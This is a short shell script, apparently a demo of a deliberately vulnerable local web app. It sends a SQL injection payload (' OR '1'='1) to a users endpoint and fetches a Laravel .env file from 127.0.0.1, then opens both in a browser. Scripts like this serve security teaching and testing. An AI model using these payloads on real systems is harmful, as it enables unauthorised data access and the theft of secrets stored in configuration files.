echo "==========================================="
echo "SQL INJECTION"
echo "curl \"http://127.0.0.1:5001/users?name='%20OR%20'1'='1\""
echo
curl "http://127.0.0.1:5001/users?name='%20OR%20'1'='1"
echo 
echo "==========================================="
echo "Laravel - Sensitive Information Disclosure"
echo 'curl http://127.0.0.1:5001/.env'
echo
curl http://127.0.0.1:5001/.env

read
open -a Google\ Chrome "http://127.0.0.1:5001/.env" &
open -a Google\ Chrome "http://127.0.0.1:5001/users?name='%20OR%20'1'='1" &
